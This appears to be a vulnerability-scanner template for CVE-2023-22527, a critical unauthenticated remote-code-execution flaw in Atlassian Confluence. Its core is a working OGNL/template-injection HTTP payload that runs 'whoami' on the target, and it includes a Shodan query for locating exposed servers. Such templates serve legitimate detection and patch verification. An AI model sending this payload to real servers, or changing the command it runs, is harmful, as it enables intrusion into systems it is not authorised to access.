http:
- extractors:
  - dsl:
    - x_vuln_check
    type: dsl
  matchers:
  - condition: and
    dsl:
    - x_vuln_check != ""
    - contains(to_lower(body), 'empty{name=')
    type: dsl
  raw:
  - 'POST /template/aui/text-inline.vm HTTP/1.1

    Host: {{Hostname}}

    Accept-Encoding: gzip, deflate, br

    Content-Type: application/x-www-form-urlencoded


    label=aaa\u0027%2b#request.get(\u0027.KEY_velocity.struts2.context\u0027).internalGet(\u0027ognl\u0027).findValue(#parameters.poc[0],{})%2b\u0027&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader(\u0027x_vuln_check\u0027,(new+freemarker.template.utility.Execute()).exec({"whoami"}))


    '
id: CVE-2023-22527
info:
  author: iamnooob,rootxharsh,pdresearch
  classification:
    cpe: cpe:2.3:a:atlassian:confluence_data_center:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-22527
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    epss-percentile: 0.08115
    epss-score: 0.00044
  description: "A template injection vulnerability on older versions of Confluence\
    \ Data Center and Server allows an unauthenticated attacker to achieve RCE on\
    \ an affected instance. Customers using an affected version must take immediate\
    \ action.\nMost recent supported versions of Confluence Data Center and Server\
    \ are not affected by this vulnerability as it was ultimately mitigated during\
    \ regular version updates. However, Atlassian recommends that customers take care\
    \ to install the latest version to protect their instances from non-critical vulnerabilities\
    \ outlined in Atlassian\u2019s January Security Bulletin.\n"
  metadata:
    max-request: 1
    product: confluence_data_center
    shodan-query: http.component:"Atlassian Confluence"
    vendor: atlassian
  name: Atlassian Confluence - Remote Code Execution
  reference:
  - https://confluence.atlassian.com/pages/viewpage.action?pageId=1333335615
  - https://jira.atlassian.com/browse/CONFSERVER-93833
  - https://blog.projectdiscovery.io/atlassian-confluence-ssti-remote-code-execution/
  severity: critical
  tags: cve,cve2023,confluence,rce,ssti
